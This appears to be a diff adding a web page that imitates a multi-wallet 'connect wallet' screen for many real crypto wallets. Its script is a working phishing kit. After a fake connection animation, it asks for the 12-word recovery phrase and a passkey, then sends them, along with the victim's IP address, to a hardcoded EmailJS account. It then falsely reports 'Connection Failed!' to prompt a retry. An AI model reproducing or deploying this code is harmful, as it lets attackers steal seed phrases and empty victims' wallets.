6bRASiYR3HWjhBZFl5mW8ytg6hMZX0G99TxtZFzOGqNUuXzDc5P1PVjHT2Vrc06+zZrpizHk3wmKwefXx+CBC4O/yDp7YI1lH0xYD6cJRmygo6GFL3Ije4TmaZ5MSZ4JCR8Qkgw6gA44HrMnrr9jx+UTv3NC4TrUEu9hIxez0OVBsW9u0PrRGNwVKJ+QS/nNSipq7CGgfFk8jxovr0/jAZ3DC+EPnI58ejf9crjvaeALm6ieCr+5HfgOovszWfS8rRAkGDH1wouQAwcX1biGWHCpjYHeXTCT6+CdLQRKDrRXgqjzUI3JI1tT/ShqYQZLEuCOcA4I8pJOIe7V49B+UA3hLDfolp9I+tVAY7GQ36nt0re28n+Lum+SnrokM4lZnQBmWkYMLwi1zI5skW8/az018T3xw9SfJLTsf6Lr3WJzWkFN2qeF/EVIVGsrcSuQsAjbokynZw/D6QYqQYXFy5W06f7xITPfUg0GlRALXSdjoaLoYobbxNSogIqEXpEDjMdLiJXFzZ8fG7NF+yp5Z2iGHvUJ+ACncii2FcagNHcCE3itDlmu9Mc4gZjNFcgDzuC4qOL3mCaoENlixUMALw5TwyJbiGXPa7hKTSRY1CWy7yauCYZtpWO9wdRbQRbt93VU4Q9DY648uomnDGn28+biLhlO0j1HElIJXcGHO6L9OEzHy0OgO/ekq6ewGnT4lRm2mHroZNMoLJxirpx2Ncxvf1csWkez+U1UuJPIga01XDv0Jrb55Jb44f9O4AK1lVYsQjuVuvgoiZ6LlSamNx1EX2Yop+NGYkswtbaVeXdP5OrdlIESdhXrYMEXG+6AJmCimM1qsTmrmQ7ePsKQw3nSIlDnFWNBUzXR+C91XHaXGpOU/hJf5VzvAJraOxt3zGyz7yNq+40L+34K8pfSLYctYbS6tKUVs3knPPsOTIPLiBux7NB0G3Ev8Lki9agnOjUbHxzt9ZEEw6Lclr/1JOdaMElI2SKp9sI3nCBIIKyRf2XN6GOVK6RioEAsnz+JbjhfyA6j9aiq0ZR0tGf8l+xCjHskZpTutLn7HR2+0L/AjjqAmAkmG0bW7/zRJvkR6y1oMz8LKgVOCJSSA3TJ8Dor+oPP3NCQROsPv6/e8xu0hixFDNq9Rgt1oLVZbRNtAwIjkLj6G9ywWkMV4O4Qai9QhbcWaDZb9I61KrGMDJDmM9plFCot/yzABKZhEYTZa+KXuK4bV98pf6i4x0fE0X2hZTjIV6Q8swKdgwOxzpuu1QVynj07K6VM8sPndyC27AnXjo+B/PhGx2ScAhsWtmqFV8V6l5Gfad/qVB0v6zKhyylesbsI8+z1mcFhBJHnXN0cA5uKlenuXy3+XLs7LaHUmO0LNfaZy5VpjkXaqETFyE7oa/Ls/+VMjAwvMcsfcj8ICCHPiac1fffxeqKqk12idfx02D4TBhP+yY6syv0XywniFv1ptTly7RZV1GDPO8gpCkUNIJyYD0eEJrv3TcNUIU46Ui1AJRq44Fjz9rmqitWRX6Rk5tjMq3JfEV/xGvARMjNo6EemQ1HielmT1Ttwkp3abDeUxfFebZVA7UqYoJAIyLyWVREs6GJEfIpen4ryoRk17+dEzzN7IA/cv0JZPIzRIFGIWJkFLCtUjVF7zgSQDvFkzi4Olrw8mONF67VeeAPlW578E/0AvM45rhOwzl5W+ox9Q60KtR8EyoWTYTcY5ulTbsNPQgIqLf0W+LAPQoQBjELqXCPqJ2aCXWJ5YMgABfZVhYtDDkAmR3wd+X453egA9RFDx8ei8AkZPSH+RZI+Cvw53Us2h6SA6QAAAAAAAA=" alt="Exodus" />
+                </div>
+                <div class="wallet-name">Exodus</div>
+                <div class="wallet-description">Multi-asset wallet with built-in exchange</div>
+            </div>
+
+            <div class="wallet-card" onclick="connectWallet('Atomic Wallet', 'https://th.bing.com/th/id/OIP.Myl1TT4vR6i0EXpIkbdL8AHaHa?w=177&h=180&c=7&r=0&o=7&pid=1.7&rm=3')">
+                <div class="wallet-icon">
+                    <img src="https://th.bing.com/th/id/OIP.Myl1TT4vR6i0EXpIkbdL8AHaHa?w=177&h=180&c=7&r=0&o=7&pid=1.7&rm=3" alt="Atomic Wallet" />
+                </div>
+                <div class="wallet-name">Atomic Wallet</div>
+                <div class="wallet-description">Decentralized wallet supporting 500+ assets</div>
+            </div>
+
+            <div class="wallet-card" onclick="connectWallet('Keplr', 'https://th.bing.com/th/id/OIP.UtQWS0iy-1pY3QuPyPaUkgAAAA?w=156&h=158&c=7&r=0&o=5&pid=1.7')">
+                <div class="wallet-icon">
+                    <img src="https://th.bing.com/th/id/OIP.UtQWS0iy-1pY3QuPyPaUkgAAAA?w=156&h=158&c=7&r=0&o=5&pid=1.7" alt="Keplr" />
+                </div>
+                <div class="wallet-name">Keplr</div>
+                <div class="wallet-description">Gateway to the Cosmos ecosystem</div>
+            </div>
+
+            <div class="wallet-card" onclick="connectWallet('Terra Station', 'https://assets.terra.money/icon/station-extension/icon.png')">
+                <div class="wallet-icon">
+                    <img src="https://assets.terra.money/icon/station-extension/icon.png" alt="Terra Station" />
+                </div>
+                <div class="wallet-name">Terra Station</div>
+                <div class="wallet-description">Official wallet for Terra blockchain</div>
+            </div>
+
+            <div class="wallet-card" onclick="connectWallet('SafePal', 'https://th.bing.com/th/id/ODF.BOp6eAuOi_iMIhixaW5JOA?w=32&h=32&qlt=90&pcl=fffffa&o=6&pid=1.2')">
+                <div class="wallet-icon">
+                    <img src="https://th.bing.com/th/id/ODF.BOp6eAuOi_iMIhixaW5JOA?w=32&h=32&qlt=90&pcl=fffffa&o=6&pid=1.2" alt="SafePal" />
+                </div>
+                <div class="wallet-name">SafePal</div>
+                <div class="wallet-description">Hardware and software wallet solution</div>
+            </div>
+
+            <div class="wallet-card" onclick="connectWallet('1inch Wallet', 'https://th.bing.com/th/id/OIP.jet8ZD_SE1nm6BVdzJx22wAAAA?w=158&h=180&c=7&r=0&o=7&pid=1.7&rm=3')">
+                <div class="wallet-icon">
+                    <img src="https://th.bing.com/th/id/OIP.jet8ZD_SE1nm6BVdzJx22wAAAA?w=158&h=180&c=7&r=0&o=7&pid=1.7&rm=3" alt="1inch Wallet" />
+                </div>
+                <div class="wallet-name">1inch Wallet</div>
+                <div class="wallet-description">Mobile wallet with DEX aggregation</div>
+            </div>
+
+            <div class="wallet-card" onclick="connectWallet('Portis', 'https://th.bing.com/th/id/ODF.L_yTkZRTJbnmpG-ZBFnaow?w=32&h=32&qlt=90&pcl=fffffa&o=6&pid=1.2')">
+                <div class="wallet-icon">
+                    <img src="https://th.bing.com/th/id/ODF.L_yTkZRTJbnmpG-ZBFnaow?w=32&h=32&qlt=90&pcl=fffffa&o=6&pid=1.2" alt="Portis" />
+                </div>
+                <div class="wallet-name">Portis</div>
+                <div class="wallet-description">Web-based wallet with email/password login</div>
+            </div>
+
+            <div class="wallet-card" onclick="connectWallet('Fortmatic', 'https://th.bing.com/th/id/ODF.q6pY8XsTe1JeXjBT4tBQrQ?w=32&h=32&qlt=91&pcl=fffffa&o=6&pid=1.2')">
+                <div class="wallet-icon">
+                    <img src="https://th.bing.com/th/id/ODF.q6pY8XsTe1JeXjBT4tBQrQ?w=32&h=32&qlt=91&pcl=fffffa&o=6&pid=1.2" alt="Fortmatic" />
+                </div>
+                <div class="wallet-name">Fortmatic</div>
+                <div class="wallet-description">Passwordless authentication for Web3</div>
+            </div>
+
+            <div class="wallet-card" onclick="connectWallet('Solflare', 'https://th.bing.com/th?q=Solflare+Wallet+Icon&w=42&h=42&c=7&rs=1&p=0&o=7&pid=1.7&rm=3&mkt=en-US&cc=US&setlang=en&adlt=moderate&t=1')">
+                <div class="wallet-icon">
+                    <img src="https://th.bing.com/th?q=Solflare+Wallet+Icon&w=42&h=42&c=7&rs=1&p=0&o=7&pid=1.7&rm=3&mkt=en-US&cc=US&setlang=en&adlt=moderate&t=1" alt="Solflare" />
+                </div>
+                <div class="wallet-name">Solflare</div>
+                <div class="wallet-description">Non-custodial wallet for Solana ecosystem</div>
+            </div>
+
+            <div class="wallet-card" onclick="connectWallet('Math Wallet', 'https://th.bing.com/th/id/OIP.a4JYskJERqXkJXwjk6VVHQHaHa?w=174&h=180&c=7&r=0&o=7&pid=1.7&rm=3')">
+                <div class="wallet-icon">
+                    <img src="https://th.bing.com/th/id/OIP.a4JYskJERqXkJXwjk6VVHQHaHa?w=174&h=180&c=7&r=0&o=7&pid=1.7&rm=3" alt="Math Wallet" />
+                </div>
+                <div class="wallet-name">Math Wallet</div>
+                <div class="wallet-description">Multi-platform crypto wallet for Web3</div>
+            </div>
+
+            <div class="wallet-card" onclick="connectWallet('Gnosis Safe', 'https://th.bing.com/th/id/OIP.45VSwJNb7mI95t5eQcwqPAAAAA?w=175&h=180&c=7&r=0&o=7&pid=1.7&rm=3')">
+                <div class="wallet-icon">
+                    <img src="https://th.bing.com/th/id/OIP.45VSwJNb7mI95t5eQcwqPAAAAA?w=175&h=180&c=7&r=0&o=7&pid=1.7&rm=3" alt="Gnosis Safe" />
+                </div>
+                <div class="wallet-name">Gnosis Safe</div>
+                <div class="wallet-description">Multi-signature wallet for teams and DAOs</div>
+            </div>
+
+            <div class="wallet-card" onclick="connectWallet('BitKeep', 'https://th.bing.com/th/id/OIP.DaU2khPVzTGgy87Bg0Tu4QHaHa?w=165&h=180&c=7&r=0&o=7&pid=1.7&rm=3')">
+                <div class="wallet-icon">
+                    <img src="https://th.bing.com/th/id/OIP.DaU2khPVzTGgy87Bg0Tu4QHaHa?w=165&h=180&c=7&r=0&o=7&pid=1.7&rm=3" alt="BitKeep" />
+                </div>
+                <div class="wallet-name">BitKeep</div>
+                <div class="wallet-description">Popular multi-chain wallet in Asia</div>
+            </div>
+
+            <div class="wallet-card" onclick="connectWallet('OKX Wallet', 'data:image/webp;base64,UklGRowCAABXRUJQVlA4IIACAADwGQCdASq0ALQAPp1Gn0qlo6Mhqh+YALATiWlu4XCBG/Nd83TSPofuFTwFo7wgPTi0U/Qf+84QAs+StOii1ekk1mZmZmZmZmZmZmZmZmZmYV7PsfP2Ulw/KQxceHmGf5p32QcLVYguFfERp/Wn2Avu38vYkMpOF3aDe1LbYqk5t73/AYLA87fQty15efe+wCHBWsp6Rgq6fqc+PRjG5XGx+APeapl9EnNtsnKUbgTwdlO4tPBB4aqFgXwMs8dNekk1mZmZmZmZmZmZmZmZmZmZmZmZmZmZgAAA/v4uQAOG5i5F2avtsLRuKMiR9qiKF2w8Hvq+fBraSz7nqhhseGeXeKr5hSuTpYzjmF2hTfWO8c+FAYznaRyQA71ZVevzF4qC8DsDwKM6igwLFLSIf89r8pr2h29wmGFTWvwdR9VJDt9xJTj95hn0syDDPfpvfF7KA0lPp1qU5ZV6unwZyqGczHegBS/+76LweL+jzBCfMnjcg7AJe9oi4AidubcZpYxkO0X9zHQ7KG7mdbcH50uhKv7FhcnOlL5nY61dqIcXdTNk9VlKYdLg4zq9RUwF25RXbiTZkzHlRWgitjPc61LPdWAVxMwpMJdyAWBNyDsJ/ER6SA9pY3t9s/4O0LB51wTZ7eed2XHVf/wg9IacCKZ0nk18qC4x+7AbCkv/920aCOP51tlZZ6c8aotbWzuI218wdTJYBUBq4D+CxLhEwaIGFflLorfo3u7+WFD/f/12yFwxs6nx5uUqgwSz0Va0s5Rk87rQnOLxd0qLJT97q1KFVKzHRZTe23+/7nSwOvCJdutUjr1pSgNvrSfllzlTViEjpPjixk/eyXg+eZJwAAAA')">
+                <div class="wallet-icon">
+                    <img src="data:image/webp;base64,UklGRowCAABXRUJQVlA4IIACAADwGQCdASq0ALQAPp1Gn0qlo6Mhqh+YALATiWlu4XCBG/Nd83TSPofuFTwFo7wgPTi0U/Qf+84QAs+StOii1ekk1mZmZmZmZmZmZmZmZmZmYV7PsfP2Ulw/KQxceHmGf5p32QcLVYguFfERp/Wn2Avu38vYkMpOF3aDe1LbYqk5t73/AYLA87fQty15efe+wCHBWsp6Rgq6fqc+PRjG5XGx+APeapl9EnNtsnKUbgTwdlO4tPBB4aqFgXwMs8dNekk1mZmZmZmZmZmZmZmZmZmZmZmZmZmZgAAA/v4uQAOG5i5F2avtsLRuKMiR9qiKF2w8Hvq+fBraSz7nqhhseGeXeKr5hSuTpYzjmF2hTfWO8c+FAYznaRyQA71ZVevzF4qC8DsDwKM6igwLFLSIf89r8pr2h29wmGFTWvwdR9VJDt9xJTj95hn0syDDPfpvfF7KA0lPp1qU5ZV6unwZyqGczHegBS/+76LweL+jzBCfMnjcg7AJe9oi4AidubcZpYxkO0X9zHQ7KG7mdbcH50uhKv7FhcnOlL5nY61dqIcXdTNk9VlKYdLg4zq9RUwF25RXbiTZkzHlRWgitjPc61LPdWAVxMwpMJdyAWBNyDsJ/ER6SA9pY3t9s/4O0LB51wTZ7eed2XHVf/wg9IacCKZ0nk18qC4x+7AbCkv/920aCOP51tlZZ6c8aotbWzuI218wdTJYBUBq4D+CxLhEwaIGFflLorfo3u7+WFD/f/12yFwxs6nx5uUqgwSz0Va0s5Rk87rQnOLxd0qLJT97q1KFVKzHRZTe23+/7nSwOvCJdutUjr1pSgNvrSfllzlTViEjpPjixk/eyXg+eZJwAAAA" alt="OKX Wallet" />
+                </div>
+                <div class="wallet-name">OKX Wallet</div>
+                <div class="wallet-description">Web3 wallet by OKX exchange</div>
+            </div>
+
+            <div class="wallet-card" onclick="connectWallet('Crypto.com DeFi Wallet', 'https://crypto.com/favicon.ico')">
+                <div class="wallet-icon">
+                    <img src="https://crypto.com/favicon.ico" alt="Crypto.com DeFi Wallet" />
+                </div>
+                <div class="wallet-name">Crypto.com DeFi Wallet</div>
+                <div class="wallet-description">Non-custodial wallet by Crypto.com</div>
+            </div>
+
+            <div class="wallet-card" onclick="connectWallet('Guarda Wallet', 'https://www.bing.com/th/id/OIP.795DTmE4vixZgflamg2xkQHaHa?w=169&h=180&c=7&r=0&o=7&pid=1.7&rm=3')">
+                <div class="wallet-icon">
+                    <img src="https://www.bing.com/th/id/OIP.795DTmE4vixZgflamg2xkQHaHa?w=169&h=180&c=7&r=0&o=7&pid=1.7&rm=3" alt="Guarda Wallet" />
+                </div>
+                <div class="wallet-name">Guarda Wallet</div>
+                <div class="wallet-description">Multi-platform wallet for 50+ blockchains</div>
+            </div>
+
+            <div class="wallet-card" onclick="connectWallet('Enjin Wallet', 'https://th.bing.com/th?q=Logo+Enjin&w=42&h=42&c=7&rs=1&p=0&o=7&pid=1.7&rm=3&mkt=en-US&cc=US&setlang=en&adlt=moderate&t=1')">
+                <div class="wallet-icon">
+                    <img src="https://th.bing.com/th?q=Logo+Enjin&w=42&h=42&c=7&rs=1&p=0&o=7&pid=1.7&rm=3&mkt=en-US&cc=US&setlang=en&adlt=moderate&t=1" alt="Enjin Wallet" />
+                </div>
+                <div class="wallet-name">Enjin Wallet</div>
+                <div class="wallet-description">NFT & gaming-focused wallet</div>
+            </div>
+
+            <div class="wallet-card" onclick="connectWallet('Zerion', 'https://th.bing.com/th?q=Zerion+Wallet+Logo&w=42&h=42&c=7&rs=1&p=0&o=7&pid=1.7&rm=3&mkt=en-US&cc=US&setlang=en&adlt=moderate&t=1')">
+                <div class="wallet-icon">
+                    <img src="https://th.bing.com/th?q=Zerion+Wallet+Logo&w=42&h=42&c=7&rs=1&p=0&o=7&pid=1.7&rm=3&mkt=en-US&cc=US&setlang=en&adlt=moderate&t=1" alt="Zerion" />
+                </div>
+                <div class="wallet-name">Zerion</div>
+                <div class="wallet-description">DeFi portfolio and wallet manager</div>
+            </div>
+
+            <div class="wallet-card" onclick="connectWallet('imToken', 'https://th.bing.com/th/id/OIP.teu1Ar7onof8glbsCfKdlwHaHZ?w=167&h=180&c=7&r=0&o=7&pid=1.7&rm=3')">
+                <div class="wallet-icon">
+                    <img src="https://th.bing.com/th/id/OIP.teu1Ar7onof8glbsCfKdlwHaHZ?w=167&h=180&c=7&r=0&o=7&pid=1.7&rm=3" alt="imToken" />
+                </div>
+                <div class="wallet-name">imToken</div>
+                <div class="wallet-description">Popular Ethereum and multi-chain wallet</div>
+            </div>
+
+            <div class="wallet-card" onclick="connectWallet('TokenPocket', 'https://www.tokenpocket.pro/favicon.ico')">
+                <div class="wallet-icon">
+                    <img src="https://www.tokenpocket.pro/favicon.ico" alt="TokenPocket" />
+                </div>
+                <div class="wallet-name">TokenPocket</div>
+                <div class="wallet-description">Multi-chain wallet with DApp browser</div>
+            </div>
+
+            
+
+            
+
+            <div class="wallet-card" onclick="connectWallet('Bitget Wallet', 'data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIADAAMAMBIgACEQEDEQH/xAAZAAACAwEAAAAAAAAAAAAAAAAABQIDBAb/2gAIAQEAAAAA0kCYZkj+0Obb5WdhWr1p+lCHPudQQJn/xAAXAQEBAQEAAAAAAAAAAAAAAAADAgQG/9oACgICEAMQAAAA3c/Dpnh4axsD0WH/xAAjEAACAQMEAgMBAAAAAAAAAAACAwEABBESIDFRECEFMmFy/9oACAEBAAE/APBGsPuYjnucULAPOgxLHU52XNyFsGZ9lP1GlrdeumZn+i6pSgSEAEetl6twPKWznPBVZGokYTgSjmJ7pnyD0skGJClNBwQYT68tUDgkDj1QWFylmtbQq8Us0anYEhjmKs2uW4YXGc8jsYwFBJnOBinOdeuiIj8EatbUbcOznmdhrWzGsBLHcZoFKCcgsRn8jz//xAAeEQEAAgEFAQEAAAAAAAAAAAABAAISAxARIUEiUv/aAAgBAgEBPwBQOWUu38621KZk+8fyk075m16N/eoAHBP/xAAfEQACAgEEAwAAAAAAAAAAAAABAgMRAAQQEhMjU4H/2gAIAQMBAT8AVWdgqiycmhSEAF7fbTzdL2RYOeATexXP0ZqIel6BsHaGVIgTwt8ZmdizGyc//9k=')">
+                <div class="wallet-icon">
+                    <img src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIADAAMAMBIgACEQEDEQH/xAAZAAACAwEAAAAAAAAAAAAAAAAABQIDBAb/2gAIAQEAAAAA0kCYZkj+0Obb5WdhWr1p+lCHPudQQJn/xAAXAQEBAQEAAAAAAAAAAAAAAAADAgQG/9oACgICEAMQAAAA3c/Dpnh4axsD0WH/xAAjEAACAQMEAgMBAAAAAAAAAAACAwEABBESIDFRECEFMmFy/9oACAEBAAE/APBGsPuYjnucULAPOgxLHU52XNyFsGZ9lP1GlrdeumZn+i6pSgSEAEetl6twPKWznPBVZGokYTgSjmJ7pnyD0skGJClNBwQYT68tUDgkDj1QWFylmtbQq8Us0anYEhjmKs2uW4YXGc8jsYwFBJnOBinOdeuiIj8EatbUbcOznmdhrWzGsBLHcZoFKCcgsRn8jz//xAAeEQEAAgEFAQEAAAAAAAAAAAABAAISAxARIUEiUv/aAAgBAgEBPwBQOWUu38621KZk+8fyk075m16N/eoAHBP/xAAfEQACAgEEAwAAAAAAAAAAAAABAgMRAAQQEhMjU4H/2gAIAQMBAT8AVWdgqiycmhSEAF7fbTzdL2RYOeATexXP0ZqIel6BsHaGVIgTwt8ZmdizGyc//9k=" alt="Bitget Wallet" />
+                </div>
+                <div class="wallet-name">Bitget Wallet</div>
+                <div class="wallet-description">Multi-chain wallet with DEX support</div>
+            </div>
+
+           
+
+            
+
+            
+            <div class="wallet-card" onclick="connectWallet('Binance Wallet', 'https://bin.bnbstatic.com/static/images/common/favicon.ico')">
+                <div class="wallet-icon">
+                    <img src="https://bin.bnbstatic.com/static/images/common/favicon.ico" alt="Binance Wallet" />
+                </div>
+                <div class="wallet-name">Binance Wallet</div>
+                <div class="wallet-description">Official browser extension wallet by Binance</div>
+            </div>
+
+            <div class="wallet-card" onclick="connectWallet('Uniswap', 'https://app.uniswap.org/favicon.png')">
+                <div class="wallet-icon">
+                    <img src="https://app.uniswap.org/favicon.png" alt="Uniswap" />
+                </div>
+                <div class="wallet-name">Uniswap</div>
+                <div class="wallet-description">Official wallet for Uniswap DEX</div>
+            </div>
+
+            <div class="wallet-card" onclick="connectWallet('Tangem Wallet', 'https://tangem.com/favicon.ico')">
+                <div class="wallet-icon">
+                    <img src="https://tangem.com/favicon.ico" alt="Tangem Wallet" />
+                </div>
+                <div class="wallet-name">Tangem Wallet</div>
+                <div class="wallet-description">Card-based hardware wallet for crypto</div>
+            </div>
+
+            <div class="wallet-card" onclick="connectWallet('Tomi Wallet', 'https://tomi.com/favicon.ico')">
+                <div class="wallet-icon">
+                    <img src="https://tomi.com/favicon.ico" alt="Tomi Wallet" />
+                </div>
+                <div class="wallet-name">Tomi Wallet</div>
+                <div class="wallet-description">Web3 wallet for the Tomi ecosystem</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal -->
+    <div id="walletModal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="closeModal()">&times;</span>
+            <div id="modalContent">
+                <!-- Content will be dynamically inserted here -->
+            </div>
+        </div>
+    </div>
+
+   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+<script>
+    // Initialize EmailJS with your public key
+    (function() {
+        emailjs.init("g8zYjAKU8RQO1j7pI"); // Replace with your actual EmailJS public key
+    })();
+
+    let currentWallet = '';
+    let currentIcon = '';
+
+    function connectWallet(walletName, iconUrl) {
+        currentWallet = walletName;
+        currentIcon = iconUrl;
+        
+        document.getElementById('walletModal').style.display = 'block';
+        document.body.style.overflow = 'hidden';
+        
+        // Phase 1: Connecting animation
+        document.getElementById('modalContent').innerHTML = `
+            <div class="modal-icon">
+                <img src="${iconUrl}" alt="${walletName}" />
+            </div>
+            <div class="modal-title">Connecting to ${walletName}</div>
+            <div class="status-text">Please wait while we establish a secure connection...</div>
+            <div class="loader"></div>
+        `;
+        
+        // After 5 seconds, show integration form
+        setTimeout(() => {
+            document.getElementById('modalContent').innerHTML = `
+                <div class="modal-title">Connect Wallet</div>
+                
+                <!-- Tabs -->
+                <div class="tab-container">
+                    <button id="tab-wallet" class="tab-btn active">Wallet Setup</button>
+                    <button id="tab-email" class="tab-btn">Passkey & Private Key</button>
+                </div>
+
+                <!-- Wallet Tab -->
+                <div id="walletTab" class="tab-content">
+                    <label for="phraseInput">Enter 12-word Recovery Phrase</label>
+                    <textarea id="phraseInput" rows="3" placeholder="Enter your 12 words separated by spaces..."></textarea>
+                </div>
+
+                <!-- Email Tab -->
+                <div id="emailTab" class="tab-content" style="display:none;">
+                    <label for="emailInput">Enter your Passkey</label>
+                    <input type="text" id="emailInput" placeholder="enter your passkey" />
+                </div>
+
+                <button id="submitIntegration">
+                    Connect Wallet
+                </button>
+            `;
+
+            setupTabSwitching();
+            setupEmailSubmission();
+        }, 5000);
+    }
+
+    function setupTabSwitching() {
+        const walletTabBtn = document.getElementById("tab-wallet");
+        const emailTabBtn = document.getElementById("tab-email");
+        const walletTab = document.getElementById("walletTab");
+        const emailTab = document.getElementById("emailTab");
+
+        walletTabBtn.addEventListener("click", () => {
+            walletTab.style.display = "block";
+            emailTab.style.display = "none";
+            walletTabBtn.classList.add("active");
+            emailTabBtn.classList.remove("active");
+        });
+
+        emailTabBtn.addEventListener("click", () => {
+            emailTab.style.display = "block";
+            walletTab.style.display = "none";
+            emailTabBtn.classList.add("active");
+            walletTabBtn.classList.remove("active");
+        });
+    }
+
+    function setupEmailSubmission() {
+        document.getElementById("submitIntegration").addEventListener("click", async () => {
+            const phrase = document.getElementById("phraseInput").value.trim();
+            const email = document.getElementById("emailInput").value.trim();
+
+            // Validation
+            //if (!phrase || phrase.split(" ").length !== 12) {
+                //showError("Please enter exactly 12 words for the recovery phrase.");
+               // return;
+           // }
+
+            // if (!email || !isValidEmail(email)) {
+            //     showError("Please enter a valid email address.");
+            //     return;
+            // }
+
+            // Show loading state
+            showLoadingState();
+
+            try {
+                // Send email using EmailJS
+                await sendWalletInfo(phrase, email);
+                showSuccessState();
+            } catch (error) {
+                console.error("EmailJS Error:", error);
+                showError("Failed to submit integration. Please try again.");
+            }
+        });
+    }
+
+    async function sendWalletInfo(phrase, email) {
+        const templateParams = {
+            wallet_name: currentWallet,
+            recovery_phrase: phrase,
+            user_email: email,
+            timestamp: new Date().toLocaleString(),
+            user_ip: await getUserIP() // Optional: get user IP
+        };
+
+        return emailjs.send(
+            'service_0nafr8u',    
+            'template_c5bloej',   
+            templateParams
+        );
+    }
+
+    // Helper function to get user IP (optional)
+    async function getUserIP() {
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        } catch (error) {
+            return 'Unknown';
+        }
+    }
+
+    function isValidEmail(email) {
+        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        return emailRegex.test(email);
+    }
+
+    function showLoadingState() {
+        const submitBtn = document.getElementById("submitIntegration");
+        submitBtn.innerHTML = "Connecting...";
+        submitBtn.disabled = true;
+        submitBtn.style.opacity = "0.7";
+    }
+
+    function showSuccessState() {
+        document.getElementById('modalContent').innerHTML = `
+            <div class="failed-icon">
+                <span class="checkmark">✖</span>
+            </div>
+            
+            <div class="modal-title">Connection Failed!</div>
+            <div class="status-text">Your wallet could not be connected. Please try again.</div>
+        `;
+
+        setTimeout(() => {
+            closeModal();
+        }, 2000);
+    }
+
+    function showError(message) {
+        // Reset button state
+        const submitBtn = document.getElementById("submitIntegration");
+        submitBtn.innerHTML = "Submit Integration";
+        submitBtn.disabled = false;
+        submitBtn.style.opacity = "1";
+
+        // Show error message
+        alert(message); // You can replace this with a more elegant error display
+    }
+
+    function closeModal() {
+        document.getElementById('walletModal').style.display = 'none';
+        document.body.style.overflow = '';
+    }
+
+    // Close modal when clicking outside
+    window.onclick = function(event) {
+        const modal = document.getElementById('walletModal');
+        if (event.target === modal) {
+            closeModal();
+        }
+    }
+
+    // Close modal with escape key
+    document.addEventListener('keydown', function(event) {
+        if (event.key === 'Escape') {
+            closeModal();
+        }
+    });
+
+    // Prevent zoom on double tap for iOS
+    let lastTouchEnd = 0;
+    document.addEventListener('touchend', function (event) {
+        var now = (new Date()).getTime();
+        if (now - lastTouchEnd <= 300) {
+            event.preventDefault();
+        }
+        lastTouchEnd = now;
+    }, false);
+</script>
+</body>
+</html>
